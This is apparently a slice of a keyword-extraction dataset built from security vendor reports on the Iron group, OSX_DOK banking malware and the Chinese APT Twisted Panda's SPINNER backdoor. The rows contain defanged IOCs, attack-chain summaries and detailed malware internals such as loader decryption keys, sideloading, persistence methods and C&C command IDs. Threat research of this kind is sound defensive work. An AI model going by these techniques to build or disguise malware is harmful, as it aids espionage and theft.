unknowingly transfer money to the attacker’s account:Pastebin Account: As part of the investigation, we also tried to figure out what additional information we may learn from the attacker’s Pastebin account:PDFmyURL converts any url to pdf!The account was probably created using the mail fineisgood123@gmail[.]com – the same email address used to register blockbitcoin[.]com (the attacker’s crypto-mining pool & malware host) and swb[.]one (Old server used to host malware & leaked files. replaced by u.cacheoffer[.]tk):1. Index.html: HTML page referring to a fake Firefox download page. 2. crystal_ext-min + angular: JS inject using malicious Chrome extension. 3. android: This paste holds a command line for an unknown backdoored application to execute on infected Android devices. This command line invokes remote Metasploit stager (android.apk) and drops cpuminer 2.3.2 (minerd.txt) built for ARM processor. Considering the last update date (18/11/17) and the low number of views, we believe this paste is obsolete.4. androidminer: Holds the cpuminer command line to execute for unknown malicious android applications, at the time of writing this post, this paste received nearly 2000 hits.PDFmyURL converts any url to pdf!Aikapool[.]com is a public mining pool and port 7915 is used for DogeCoin:The username (myapp2150) was used to register accounts in several forums and on Reddit. These accounts were used to advertise fake “blockchain exploit tool”, which infects the victim’s machine with Cobalt Strike, using a similar VBScript to the one found by Malwrologist (ps5.sct).XAttacker: Copy of XAttacker PHP remote file upload script. miner: Holds payload URL, as mentioned above (IronStealer).FAQ:How many victims are there? It is hard to define for sure, , but to our knowledge, the total of the attacker’s pastes received around 14K views, ~11K for dropped payload URL and ~2k for the android miner paste. Based on that, we estimate that the group has successfully infected, a few thousandsPDFmyURL converts any url to pdf!victims.Who is Iron group? We suspect that the person or persons behind the group are Chinese, due in part to the following findings: . There were several leftover comments in the plugin in Chinese. . Root CA Certificate password (‘f*ck your mom123’ was in Mandarin) We also suspect most of the victims are located in China, because of the following findings: . Searches for wallet file names in Chinese on victims’ workstations. . Won’t install persistence if Qhioo360(popular Chinese AV) is foundIOCS:blockbitcoin[.]com pool.blockbitcoin[.]com ssl2.blockbitcoin[.]com xmr.enjoytopic[.]tk down.cacheoffer[.]tk dzebppteh32lz.cloudfront[.]net dazqc4f140wtl.cloudfront[.]net androidapt.s3-accelerate.amazonaws[.]com androidapt.s3-accelerate.amazonaws[.]com winapt.s3-accelerate.amazonaws[.]com Ex-officer in the IDF-CERT. Malware analyst and Reverse Engineer with vast experience in dealing with Nation-sponsored cyber attacks. | omri@intezer.comTags:backdoorbitcoincryptominercybercrimemalwareransomwarechinaironShare:Register to our free communityTry it nowPDFmyURL converts any url to pdf!Executable And Linkable Format 101 Pa…Digital Certificates- When The Chain Of T…Home ProductsIntezer Analyze™Compromise AssessmentTechnology CompanyAboutNews and EventsIntezer Blog Contact© Intezer.com 2017 All rights reservedTerms ofUsePrivacyPolicyPDFmyURL converts any url to pdf! ","{'phrases': ['the malware', 'malicious Chrome extension', 'stealth', 'CA', 'Iron Backdoor dll', 'IE', 'persistence', 'The backdoor', 'Xagent', 'miner', 'Iron ransomware', 'cryptocurrency wallet', 'files', 'wallet address', 'Pastebin Account', 'command', 'control', 'VM', 'detection', 'VER', 'HackingTeam', 'code'], 'target': 'the malware; malicious Chrome extension; stealth; CA; Iron Backdoor dll; IE; persistence; The backdoor; Xagent; miner; Iron ransomware; cryptocurrency wallet; files; wallet address; Pastebin Account; command; control; VM; detection; VER; HackingTeam; code.'}"
a phishing email; documents; links; the malware; WERDLOD; RATs; the user; the malware; keylogging; Command; control; servers; the attacker; IP; credentials; the malware; network traffic; the attacker; a Man-in-the- Middle attack.,"[""1. The attacker sends a phishing email containing a malicious .zip or .docx file to the victim. 2. If the victim opens the attachment on a macOS system, the OSX_DOK malware is installed. 3. OSX_DOK shows a fake OSX software update screen to gain admin access. 4. The malware installs malicious certificates and proxies on the system to perform a MITM attack. 5. When the user visits a target banking/financial site, their connection is hijacked and redirected to a fake login page controlled by the attacker. 6. The victim enters account credentials on the fake page, which are secretly sent to the attacker's server. 7. The attacker can then log into the real banking site using the stolen credentials to steal money or sensitive data. 8. OSX_DOK can also download additional payloads, executables, and scripts from its command and control server. 9. The malware establishes persistence on the infected system to continue monitoring and data theft. 10. Network traffic is redirected through Tor to evade detection and obscure the attacker's location. ""]","Extract the keywords: Trend MicroAbout TrendLabs Security Intelligence BlogGo to…▼Home » Malware » OSX Malware Linked to Operation Emmental Hijacks User Network TrafficOSX Malware Linked to Operation Emmental Hijacks User Network Trafﬁc Posted on: July 10, 2017 at 7:00 am1960Posted in: Malware Author: Rubio Wu (Threats Analyst)The OSX_DOK malware (Detected by Trend Micro as OSX_DOK. C) showcases sophisticated features such as certificate abuse and security software evasion that affects machines using Apple’s OSX operating system. This malware, which specifically targets Swiss banking users, uses a phishing campaign to drop its payload, which eventually results in the hijacking of a user’s network traffic using a Man-in-the- Middle (MitM) attack. OSX_DOK.C seems to be another version of WERDLOD (Detected by Trend Micro as TROJ_WERDLOD), which is a malware that was used during the Operation Emmental campaigns—an interesting development that we will tackle further in this blog post.Arrival Method and Infection FlowFigure 1: OSX_DOK.C infection routine for Mac systemsOSX_DOK.C first arrives via a phishing email that contains certain files labeled as either .zip or .docx files. The sample we analyzed was a purported message from a police inspector in Zurich allegedly claiming to unsuccessfully contact the recipient. The email also comes with two files attached claiming to contain questions for the user: one is a .zip file, which is a fake OSX app, while the other is a .docx file used to target Windows operating systems using WERDLOD. Both of these samples work as Banking Trojans and provide similar functionalities.Some examples of the files used in the email attachment include the following:Zahlungsinformationen 01.06.2017.zip Zahlungsinformationen digitec.zip zip Dokument 09.06.2017.zip Dokument 09.06.2017.docx 06.2017.docxOnce the docx file included in the phishing email is clicked, a warning window will pop up:Featured StoriesIIS 6.0 Vulnerability Leads to Code ExecutionWinnti Abuses GitHub for C&C CommunicationsMajikPOS Combines PoS Malware and RATs to Pull Off its Malicious TricksNew Linux Malware Exploits CGI VulnerabilityCVE-2017-5638: Apache Struts 2 Vulnerability Leads to Remote Code ExecutionBusiness Process CompromiseAttackers are starting to invest in long- term operations that target specific processes enterprises rely on. They scout for vulnerable practices, susceptible systems and operational loopholes that they can leverage or abuse. To learn more, read our Security 101: Business Process Compromise.Business Email CompromiseHow can a sophisticated email scam cause more than $2.3 billion in damages to businesses around the world? See the numbers behind BECLatest Ransomware PostsSLocker Mobile Ransomware Starts Mimicking WannaCryLarge-Scale Petya Ransomware Attack In Progress, Hits Europe HardAdGholas Malvertising Campaign Employs Astrum Exploit KitErebus Resurfaces as Linux RansomwareAnalyzing the Fileless, Code-injecting SOREBRECT RansomwareRecent PostsOSX Malware Linked to Operation Emmental Hijacks User Network TrafficJuly’s Android Security Bulletin Addresses Continuing Mediaserver and Qualcomm IssuesYour email hereSubscribeFigure 2: Warning window on OSXThis infographic shows how ransomware has evolved, how big the problem has become, and ways to avoid being a ransomware victim. Check the infographicHere’s our in-depth feature on #cryptocurrencies, the threats that abuse them & some countermeasures:… twitter.com/i/web/status/8… about 12 hours agoBithumb hack shows that #cryptocurrency faces unique threats. Details and best practices: bit.ly/2tP69pU about 15 hours agoAnalyzing the Fileless, Code-injecting SOREBRECT RansomwareAnalyzing Xavier: An Information-Stealing Ad Library on AndroidMouse Over, Macro: Spam Run in Europe Uses Hover Action to Deliver Banking TrojanLarge-Scale Petya Ransomware Attack In Progress, Hits Europe HardErebus Resurfaces as Linux RansomwareOur research with @polimi on #robot security will be presented at #BHUSA: bit.ly/2p2Rndh #ICSRansomware 101SLocker Mobile Ransomware Starts Mimicking WannaCryInformation Stealer Found Hitting Israeli HospitalsLarge-Scale Petya Ransomware Attack In Progress, Hits Europe HardPopular PostsEmail Subscriptionabout 4 hours agoAfter this, the App Store on the system will be removed, followed by a full screen fake OSX update screen.It will ask for a password to run command as root.Figure 3: Fake OSX update screenLatest TweetsFigure 4: Fake OSX update screenThe malware will begin to download other utilities. It relies on Homebrew, an open source software package manager to install Golang and Tor.Stay UpdatedThe malware will then install fake certificates in the system to perform a MitM attack without notifying the user.The structure of the fake App Store matches the application bundle structure and provides both English and German interfaces. The main executable is Dokument.app/Contents/MacOS/AppStore.The archive in Mac OSX looks like this:Figure 5: Fake document fileMac OSX will run the application if it passes certificates. In this case, the malware is signed off by a “developer”, which may actually be a dummy account or that of a compromised user. In addition, the time stamp on the CA is new, which might mean that it was obtained specifically for this attack.The fake certificate imitates the COMODO root certificate. Take note that the fake certificate does not contain a COMODO Certificate Authority seal that certifies its validity, as seen in the comparison below:Figure 6: Comparison of a Fake COMODO (left) root certificate vs a genuine COMODO certificate(right)We noticed that this malware will not work for Mozilla Firefox or Google Chrome since these two browsers have their own root certificates. Of all the major browsers, only Safari uses the system’s certificates.We observed the attacker targeting both Windows and Mac OSX in the same spam mail on June 9, 2017. There is a file shortcut embedded in the malicious .docx file—one that will download an executable file from Dropbox—that executes once clicked by the user. The functionalities are similar to the malicious app provided, which includes installing tor and proxy.We have already notified Dropbox about the use of its service for this malware. Dropbox has already taken down the links.The malware will install two proxies running on local host port 5555 and 5588. All of the traffic will be hijacked into the first proxy (port 5555) with the victim’s external IP address as parameter.Figure 7: Installing proxies on local host port 5555The first (port 5555) proxy first finds the IP parameter. If it is not in Switzerland, the traffic will proceed as normal. If it detects an IP located in Switzerland, the malware will run an obfuscated JavaScript code and find its visiting domain. If the domain is in the target, the malware will perform a MitM attack and redirect the traffic to the second proxy (port 5588), which routes the traffic to the Tor network. The purpose of these steps is to target users in Switzerland and hijack their trafficAfter deobfuscating the malware, we found the target domains:Figure 8: Hardcoded list of target banking websites in SwitzerlandThe target domain’s visitors will be redirected into an e-banking login page that looks and acts normally, but is located on dark web sites.However, once the victim enters an account and password. A window will pop out.Figure 9: Hijacking connection to EKR bankThe pop-out window is just smoke and mirrors, where nothing actually happens once the countdown timer reaches zero.We analyzed the webpage and found attackers injecting a script into the webpage. Once the user enters an account and password, it will initiate POST using AJAX. The POST message is sent to the same site as the fake login page—which an attacker can control inside the Tor network.Figure 10: Post message carrying argumentWe decoded the data section and found not only the account and password, but that it also fingerprinted the user’s browser and system information.While Operation Emmental was able to bypass two-way authentication by tricking its victims into installing a fake app, we have not observed OSX_DOK.C doing this. However, since they can inject code into the webpage, it means they have the ability to do this as well.Performing static analysis on OSX_DOK.CWe performed static analysis on the sample and found it packed by Ultimate Packer for Executables (UPX), an open source executable packer that can often be abused by malware. We successfully unpacked the initial sample we found dropped by the UPX unpacker.The malware is not obfuscated so we easily found interesting strings here. We can see that the malware relies on bash shell for most of its setup.Figure 11: OSX_DOK.C stringsWe were not able to unpack the sample discovered after June 9, 2017. The UPX gave a warning message about memory buffer overflow. The malware author seemingly made unpacking the malware more difficult to slow down or even evade the antivirus engine’s scanning process. The packer is the same but the malware tries to exploit the undiscovered bug in the UPX library that causes unpack failure. We have reported the issues to the UPX team, and they have already fixed it.The impacted versions of the UPX library are 3.94, 3.93, and 3.92. This technique enables the malware to efficiently run while evading unpacking techniques from the AntiVirus-integrated UPX library.Connecting OSX_DOK.C with WERDLODAs mentioned earlier, we believe that OSX_DOK.C might be the MAC OSX version of WERDLOD, an online banking malware that used the same techniques as Operation Emmental. Other research have also connected the OSX malware and Retefe (the external term used for WERDLOD) via similarities in their behavior.While OSX_DOK.C is designed for MAC OSX, which is a Unix-like system, WERDLOD is designed for Windows. But in terms of features and behaviors, these two malware are very similar. Here is a list of their similarities.Both malware kill all current browsers before installing fake certificates:Both WERDLOD and OSX_DOK.C are designed to kill the browser process before installing fake certificates. While WERDLOD kills processes for Internet Explorer, Firefox, and Chrome, OSX_DOK.C does the same on Safari, Firefox, and Chrome.Both malware share the same proxy settings and script:While WERDLOD and OSX_DOK.C use different codes (since they target different operating systems), they have similar proxy settings and script formats. In particular, WERDLOD uses scripts running on Switzerland. Further analysis of both malware revealed that their main targets are very similar, as seen in the screenshot below. While it’s possible that this is a coincidence, the rest of the evidence makes it unlikely for these two malware to target the same organizations by chance.Figure 14: OSX_DOK.C target banksGiven the connection between WERDLOD and OSX_DOK.C, it is reasonable to assume that the latter is also a part of the Operational Emmental campaign. To further illustrate, here is a timeline of Operation Emmental and its potential relationship to OSX_DOK.C:Figure 15: Connecting Operation Emmental with OSX_DOK.CMitigation and Trend Micro SolutionsDespite phishing incidents for Mac devices being rarer than their Windows counterparts, users should still be aware that attackers can target them at any moment. By implementing best practices for phishing-type attacks—such as refraining from downloading files unless they are absolutely certain that they come from trustworthy sources—users can avoid being victimized by malware such as OSX_DOK.C that prey on users who lack awareness of phishing strategies.In addition, end users can also benefit from security solutions such as Trend Micro Home Security for Mac, which provides comprehensive security and multi-device protection against viruses, ransomware, malicious websites, and identity thieves. It also provides secure storage of passwords and other sensitive information. Trend Micro™ Mobile Security for Apple devices (available on the App Store) can monitor and block phishing attacks and other malicious URLs.For enterprises, Trend Micro’s Smart Protection Suites with XGen™ security, which support Mac systems, infuse high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint.With additional analysis from Yi-Jhen Hsieh (DSNS lab, National Chiao Tung University)Related Posts:A Rising Trend: How Attackers are Using LNK Files to Download Malware DressCode Android Malware Finds Apparent Successor in MilkyDoor Picture Perfect: CryLocker Ransomware Uploads User Information as PNG Files Network Solutions to Ransomware – Stopping and Containing Its SpreadLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:ENTERPRISE»SMALL BUSINESS»HOME»HOME AND HOME OFFICE |FOR BUSINESS |SECURITY INTELLIGENCE |ABOUT TREND MICROAsia Pacific Region (APAC): Australia / New Zealand, , ⽇, 대한민국 ,  Europe, Middle East, & Africa Region (EMEA): France, Deutschland / Österreich / Schweiz, Italia, Россия, España, United Kingdom / IrelandLatin America Region (LAR): Brasil, MéxicoNorth America Region (NABU): United States, CanadaPrivacy StatementLegal PoliciesCopyright © 2017 Trend Micro Incorporated. All rights reserved. ","{'phrases': ['the attacker', 'a phishing email', 'the victim', 'MAC', 'the OSX_DOK malware', 'the malware', 'certificates', 'proxies', 'the system', 'a MITM attack', 'the user', 'addition', 'executables', 'scripts', 'command', 'tor', '10', 'Network traffic'], 'target': 'the attacker; a phishing email; the victim; MAC; the OSX_DOK malware; the malware; certificates; proxies; the system; a MITM attack; the user; addition; executables; scripts; command; tor; 10; Network traffic.'}"
spear-phishing emails; targets; Russian; Government; targets; the victims; links; exe; an external template; PE; a macro; LoadLibrary; A; shellcode; shellcode; system info; the SPINNER backdoor; commands; the infected system; data; the attacker; operators; 10; staging; detection.,"[' 1. The attack starts with a spear phishing email containing a malicious Office document attachment. 2. The document macro reaches out to download a remote template containing additional macro code. 3. The macro writes and executes shellcode from an INIT file to setup persistence and run the next stage loader. 4. The loader DLL sideloads a legitimate Windows binary like cmdl32.exe. 5. The loader decrypts and executes shellcode from the INIT file. 6. The shellcode injects into and executes the Nimbda loader module within notepad.exe. 7. Nimbda decrypts and loads the next stage - an obfuscated SPINNER backdoor executable. 8. SPINNER injects into msiexec.exe and collects system info to beacon back to its command and control server. 9. SPINNER can receive additional modules or payloads from the attacker controlled server. 10. The final payload provides remote access, exfiltration, and further capabilities to the attacker. ']","Extract the keywords: research.checkpoint.com /2022/twisted-panda-chinese-apt-espionage-operation-against-russians-state-owned-defense-institutes/ Twisted Panda: Chinese APT espionage operation against Russian’s state-owned defense institutes ⋮ 5/19/2022May 19, 2022 IntroductionIn the past two months, we observed multiple APT groups attempting to leverage the Russia and Ukraine war as a lure for espionage operations. It comes as no surprise that Russian entities themselves became an attractive target for spear-phishing campaigns that are exploiting the sanctions imposed on Russia by western countries. These sanctions have put enormous pressure on the Russian economy, and specifically on organizations in multiple Russian industries.Check Point Research (CPR) details a targeted campaign that has been using sanctions-related baits to attack Russian defense institutes, part of the Rostec Corporation. The investigation shows that this campaign is part of a larger Chinese espionage operation that has been ongoing against Russian-related entities for several months. CPR researchers estimate with high confidence that the campaign has been carried out by an experienced and sophisticated Chinese nation-state APT. In the below blog, the researchers reveal the tactics and techniques used by the threat actors and provide a technical analysis of the observed malicious stages and payloads, including previously unknown loaders and backdoors with multiple advanced evasion and anti-analysis techniques.Key findings:CPR unveils a targeted campaign against at least two research institutes in Russia, whose primary expertise is the research and development of highly technological defense solutions. Research suggests that another target in Belarus, likely also related to the research field, received a similar spear-phishing email claiming that the US is allegedly spreading a biological weapon. The defense research institutes that we identified as targets of this attack belong to a holding company within the Russian state-owned defense conglomerate Rostec Corporation. It is Russia’s largest holding company in the radio-electronics industry and the specific targeted research institutes’ primary focus is the development1/20and manufacturing of electronic warfare systems, military-specialized onboard radio-electronic equipment, air- based radar stations and means of state identification. This campaign is a continuation of what CPR believes to be a long-running espionage operation against Russian-related entities that has been in operation since at least June 2021. The operation may still be ongoing, as the most recent activity was observed in April 2022. This activity was attributed with high confidence to a Chinese threat actor, with possible connections to Stone Panda (aka APT10), a sophisticated and experienced nation-state-backed actor, and Mustang Panda, another proficient China-based cyber espionage threat actor. CPR named this campaign Twisted Panda to reflect the sophistication of the tools observed and the attribution to China. The hackers use new tools, which have not previously been described: a sophisticated multi-layered loader and a backdoor dubbed SPINNER. These tools are in development since at least March 2021 and use advanced evasion and anti-analysis techniques such as multi-layer in-memory loaders and compiler-level obfuscations.Infection chainOn March 23, malicious emails were sent to several defense research institutes based in Russia. The emails, which had the subject “List of <target institute name> persons under US sanctions for invading Ukraine”, contained a link to an attacker-controlled site mimicking the Health Ministry of Russia minzdravros[.]com and had a malicious document attached:Figure 1: Spear-phishing email sent to research institutions in Russia.On the same day, a similar email was also sent to an unknown entity in Minsk, Belarus with the subject “US Spread of Deadly Pathogens in Belarus”. All the attached documents are crafted to look like official documents from the Russian Ministry of Health, bearing its official emblem and title:2/20Figure 2: Screenshot of the lure document sent to research institutions in Russia.Each document downloads an external template from the URLs with a similar format, such as url The external template contains a macro code that imports several API functions from kernel32 (LoadLibraryA, CreateFileA, WriteFile, ReadFile, etc) and uses them to:Write three files (cmpbk32.dll, cmpbk64.dll, and INIT) to the path: C:/Users/Public. Load cmpbk32.dll or cmpbk64.dll (depending on the system OS architecture) and execute its exported function R1.Execution of the exported function R1 finalizes the initialization of the malicious files. The malware creates a working directory %TEMP%\\OfficeInit and copies to it INIT and cmpbk32.dll files, as well as a legitimate 32-bit Windows executable cmdl32.exe from either System32 or SysWOW64 folder, depending on if the operating system is 32 or 64 bit.3/20Figure 3: The simplified infection chain. The LoaderThe loader is a 32-bit DLL utilizing dynamic API resolving with name hashing for evasion and anti-analysis. The loader is not only able to hide its main functionality, but also avoid static detection of suspicious API calls by dynamically resolving them instead of using static imports.The purpose of cmpbk32.dll is to load specific shellcode from the INIT file, depending on the infection stage, and run it. The INIT file contains two shellcodes: the first-stage shellcode runs the persistence and cleanup script, and the second-stage shellcode is a multi-layer loader. The goal is to consecutively decrypt the other three fileless loader layers and eventually load the main payload in memory. To distinguish between the stages, the DLL entry point DllMain performs different actions based on the call reason.Setup StageWhen the malicious document is closed, a PROCESS_DETACH event is triggered. The DLL executes a portion of the INIT file in charge of cleaning up the files created by the malicious document and creates a scheduled task for persistence:4/20Figure 4: DLLMain PROCESS_DETACH event executes shellcode responsible for persistence and cleanup from INITFigure 5: Persistence and cleanup functionLoader stageThe main loading process begins with the scheduled task running cmdl32.exe which loads the malicious DLL cmpbk32.dll. DLL sideloading by a legitimate process is a technique commonly used by threat actors; coupling it with a robust loading process can help evade modern anti-virus solutions as, in this case, the actual running process is valid and signed by Microsoft. Note that the cmpbk64.dll is not copied into the %TEMP%\\OfficeInit folder. The 64-bit version of the DLL is only used in the initial infection stage by the 64-bit MS Word process, as the 32-bit cmdl32.exe can only load 32-bit cmpbk32.dll.When the DLL is loaded, the PROCESS_ATTACH event is triggered and starts a sequence of operations. The sequence peels off multiple encrypted layers from the INIT file and eventually reveals and executes the final payload. It first reads an XOR-encrypted blob from the INIT file and decrypts it in memory using a simple XOR with5/20the key 0x9229. The decrypted blob is a position-independent code and the first of the encrypted layers that “protects” the main payload.Figure 6: Layers of decryption performed by the loader to uncover the final payload.This first layer is rather simple. It dynamically loads from Kernel32.dll the WinAPI functions that are essential for its work. Next, it begins a sequence of operations to uncover the second layer. It uses RC4 with the following hardcoded key: 0x1C, 0x2C, 0x66, 0x7C, 0x11, 0xCF, 0xE9, 0x7A, 0x99, 0x8B, 0xA3, 0x48, 0xC2, 0x03, 0x07, 0x55. It then decompresses the decrypted buffer using RtlDecompressBuffer, and finally, uses rolling XOR to decode the result and reveal the second layer.6/20Figure 7: Injection to msiexec.exeThe injected code begins by dynamically loading a PE file embedded inside and executing it from its entry point. SPINNER backdoor: technical analysisThe payload uses two compiler-level obfuscations:Control flow flattening: alters the code flow making it non-linear Opaque predicates: defines unused logic and causes the binary to perform needless calculationsBoth methods make it difficult to analyze the payload, but together, they make the analysis painful, time-consuming, and tedious. These two types of obfuscations were previously spotted being used together in samples attributed to the Chinese-speaking group Stone Panda (APT10) and Mustang Panda.7/20Figure 8: Opaque predicate and control flow flattening code obfuscations in the SPINNER sample.When the SPINNER backdoor starts to run, it creates a mutex called MSR__112 to ensure there is only one instance of the payload running at a time. The payload also expands the persistence previously created by the loader. It creates a new registry key OfficeInit under SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run that points to the cmdl32.exe path.Next, it sets up its own configuration, which contains the following fields: struct malware_config { std::string full_c2_url; std::string host_name; std::string c2_uri; }The full_c2_url is decrypted using XOR decryption with the key 0x50. After decryption, the function InternetCrackUrlA is used to crack a URL into its component parts: the c2_url_without_scheme, c2_uri, port and use_https fields.Next, the backdoor starts its main loop by checking if it’s the first run and therefore system fingerprinting has not yet occurred. If the answer is no, the backdoor creates a random 16-byte Bot ID and saves it to the file8/20%TEMP%\\OfficeInit\\init.ini. It then collects data about the infected system and creates a string containing the following data:Bot ID Sleep time retrieved from the malware config Process ID NULL appended at the end of the stringWhen it has the string containing all the gathered data, the backdoor prepares a packet to be sent to the C&C server, constructed in the following way:Offset 16 null bytes 4-byte command ID – 0x10010001 4 null bytes System information string length System information stringNext, the backdoor generates a random 8-byte RC4 key that is used to encrypt the entire packet. The final packet has this structure:Offset 8-byte randomly generated RC4 key Packet data size Packet dataThe packet is sent through the HTTP/S depending on the URL retrieved from the malware configuration. Similar to the request, the response from the C&C server is encrypted with RC4 and has the same structure containing the key, size, and data. The C&C response can contain one of the following commands:Command ID Self-update – Write data to the INIT file and create another instance of the cmdl32.exe using CreateProcessW. Collect system information and send the data back to the C&CJudging by the supported commands, this version of the SPINNER backdoor has only basic capabilities to enumerate the host system. Its main purpose is to run additional payloads received from the C&C server. While we were not able to get other payloads, based on other findings described later in the research, we believe that selected victims likely received the full backdoor with additional capabilities. Previous campaignWhile searching VirusTotal for files similar to the loader, we encountered an additional cluster which also utilizes DLL sideloading to launch an in-memory loader that is very similar to the one we discussed previously. It then loads a payload that could be an earlier variant of the SPINNER backdoor. Judging by the names of the files and compilation stamps of the executables, the campaign has been active since June 2021.Unlike the current campaign, which uses Microsoft Word documents as a dropper, the previous wave of attacks relied on executables bearing the Microsoft Word logo. This suggests these droppers were intended to be delivered to the victims by the same means as the malicious documents, via spear-phishing emails, either as attachments or links to fake sites.The DropperThe dropper is a 64-bit executable that has a simpler flow than the previously discussed malicious document:9/20Figure 9: The Infection chain of the campaign starts with the executable dropper.First, it extracts the following files from resources: rekeywiz.exe, UnityPlayer.dll and PIN, and drops them into the working folder C:\\Users\\Public\\PublicPIN. The file rekeywiz.exe masquerades as a legitimate Windows executable EFS REKEY Wizard, but in fact, is a Steam gaming platform interactive wallpaper called Sheep. Sheep is a digitally signed Unity-based application for Steam Wallpaper Engine. Therefore, it can evasively side-load the malicious loader that imitates Unity dll which in turn loads, decrypts and executes the shellcode from the PIN file.The dropper also decrypts from the resources, drops a decoy Word document to %USER%\\Documents\\offic\\ (the typo is on the actor) and opens it for the victim. All the decoy documents we observed in different droppers used Russian government-related themes, such as the Decrees of the President of the Russian Federation, with documents’ names and content in Russian. It can be assumed that the campaign is also targeting entities in or related to Russia.Figure 10: A fragment of the decoy document launched by the dropper.For persistence, the dropper creates a scheduled task called InterSys that points to rekeywiz.exe. The code handling this is very similar to the “persistence and cleanup” function from the loader we described earlier:10/20Figure 11: Persistence set up by the dropper.The LoaderThe older versions of the loader contain debugging information and feature an interesting PDB path: C:\\D\\StageS\\Release\\HackDll2.pdb.As the infection chain is simpler, when it is side-loaded by rekeywiz.exe, the loader only handles the PROCESS_ATTACH event. The payload decryption code for the loader is similar to the one we described, and it performs the same steps as the new loader: XOR decryption for the first layer encryption, RC4 decryption for the second layer, and injection to a newly created msiexec.exe.11/20Figure 12: UnityPlayer.dll XORing bytes from the PIN file (with the keys 0x29, 0x92) vs cmpbk32.dll XORing bytes from the INIT file (with the keys 0x29, 0x92)Final payload – full SPINNER backdoorMany of the functions inside the final payload share similar logic with the SPINNER variant described above, but the payload lacks the compiler-level obfuscations observed in the newer campaign making it easier to analyze. Furthermore, the previous version of the backdoor contains additional features. This is another indication that the initial SPINNER backdoor version we observed is only a part of the bigger payload. It’s likely the actors eventually split the payload and only equipped the first stage of the main backdoor with essential functions: enumeration of the victim’s machine and execution of the next stage payloads received from the C&C server.The full version of the SPINNER backdoor contains the following capabilities:Collects information about the infected machine (enumerate disks, files). Exfiltrates files from the infected machine and manipulates the local files. Runs OS commands and executes downloaded payload, as part of typical backdoor capabilities.Below is the full list of supported commands:Command ID Enumerate disk drives NoneArguments0x100400020x10040003 0x100400060x100400070x10040008Enumerate files in a directoryDirectory NameCreate directory Copy fileDirectory Name Original File Name and New File Name (separated by ‘\t’) File Name Original File Name and New File Name (separated by ‘\t’) Original File Name and New File Name (separated by ‘\t’)Move file Reads file data (Max File Size = 0xA00000) File Name0x10040009Write to file0x10050001Run command using cmd.exeA struct that contains: File Name, File Name Size, Content To Write, Logical drive strings and their drive ty For every file in the specified directory Filename, 0/1 (directory or not), file siz last_write_time. Output format: “%s\t%s\t%lld\t%d.%d.%d %d:%d:%d” Return valueReturn valueFile contentReturn valueOutput from Command Line12/20Send User Info (same as the first message to C&C)NoneNew Sleep TimeBot ID (saved to and retrieved from version.dll file), Computer Name, Hos x86/x64, User Name, Sleep Time, Pro 0x100000030x10030001Update Sleep time Do nothing Self-delete and exit process (create and run a file named a.bat with the content “ping *\r\n”). Also, delete persistence from the Run Registry Key.NoneNoneThe communication protocol between the SPINNER backdoor and the C&C server didn’t change from one version to the next.Campaign TTPs evolutionIn less than a year, the actors significantly improved the infection chain and made it more complex. All the functionality from the old campaign was preserved, but it was split between multiple components making it harder to analyze or detect each stage. Here are some examples of the split components:The EXE dropper functionality is split between a malicious document and the loader. It’s a reasonable adjustment as an executable. Even one that masquerades as a document might raise a lot more suspicion than a carefully crafted document. Adding more functionality to the DLL loader. Interestingly, the actors chose not to add more exported functions to the DLL, but to handle different call reasons in DllMain, making some parts of malicious code run stealthy in the background when the document is closed. Although the loader contains some anti-analysis and evasion techniques, such as the use of shellcode and dynamic API resolving using hashed, in the latest campaign the actors added significant improvements by supplementing complex compiler-level obfuscations to the SPINNER backdoor. In addition to the complex obfuscations, the SPINNER backdoor was reduced to only basic functionality. This was likely done to increase the malware’s stealth and evasion.AttributionSPINNER backdoorAs with any unknown malware sample, the SPINNER loader and backdoor analysis required CPR to determine whether it was a known malware sample or an entirely new malware family. At first glance, the payload looked similar to the PlugX/Hodur malware described by ESET in a recently published report on Chinese APT Mustang Panda. The first similarity is in the ID numbering of C&C commands: both malware use 2 bytes to specify the command category and 2 bytes for a specific command from this category. For example, the command 0x10010001 is used in the SPINNER variant to send the system information data, while Hodur malware uses the command group 0x1001 and command ID 0x1001 for the same action.In addition, some of the commands themselves overlap between the samples, such as those that list the logical drives, get detailed information about the files in a directory, or execute commands using cmd.exe. These functionalities are not unique and can usually be found in many backdoors. In this case, the two malware share an even greater and more surprising similarity. After opening the Hodur PlugX variant in the disassembler, it became apparent that Hodur — like SPINNER — was heavily obfuscated using Control Flow Flattening (CFF). However, Hodur’s CFF is different from SPINNER’s. Hodur’s CFF relies on a dispatcher that uses a certain register to decide which code block to jump to next, while in SPINNER the register is used as-is without any manipulation. In the PlugX variant, additional arithmetic operations are used on the register before it is checked by the dispatcher. To complete the obfuscation comparison, Hodur heavily obfuscates its API calls and strings, a step which is absent in SPINNER.13/20Figure 13: Control flow flattening used in SPINNER variant (on the left) vs control flow flattening with arithmetic operations on the CFF register used in the Hodur variant (on the right).In terms of implementation, the malware samples are entirely different. Hodur is a multithreaded Windows Desktop application and communicates with the C&C through multiple threads, each with its own purpose, while SPINNER is a single-threaded Console application. Hodur’s enumeration method is more extensive than SPINNER’s, but it does not use Bot ID which identifies a specific infected machine. The self-delete function in Hodur might be similar in its logic to SPINNER, but it uses a completely different set of commands to delete itself and its associated files. Hodur’s communication logic with the C&C is more complex, drawn from different parts of the code and from multiple threads, while SPINNER has only has one function that handles the commands.While the differences indicate these malware belong to different families, they share “best practices” similarities. Here are some examples of their similarities:Both use WS2_32 functions to retrieve the local computer IPv4 address They show interest in enumeration files in certain directories by looking for specific data such as the last access time Both enumerate the disk drives, searching thumb drives for interesting data They execute commands from the C&C through cmd.exe using a pipe, etc.It can be argued that those are just common techniques used by all backdoors, but it is not unlikely that these tools might have the same upstream source and therefore share many best practices and methods.Chinese-based activityThe Tactics, Techniques, and Procedures (TTPs) of this operation enabled us to attribute it to Chinese APT activity. In general, Chinese groups are known to reuse and share tools between them. Without enough strong evidence, such as infrastructure-based connections, we couldn’t directly attribute this activity with high confidence to any specific Chinese threat actor. However, the Twisted Panda campaign bears multiple overlaps with advanced and long- standing Chinese cyberespionage actors:The control-flow obfuscations observed in SPINNER were previously used by the Chinese group APT10 and the same time as Twisted Panda. The infection flow relying on DLL side-loading is a favorite evasion technique used by multiple Chinese actors. Examples include the infamous PlugX malware (and its multiple variants, including the aforementioned Mustang Panda’ Hodur samples), the recently published APT10 global espionage campaign that used the VLC player for side-loading, and other APT10 campaigns. In addition to the similarities between SPINNER and Hodur that we previously mentioned, other practices like multi-layer in-memory loaders based on 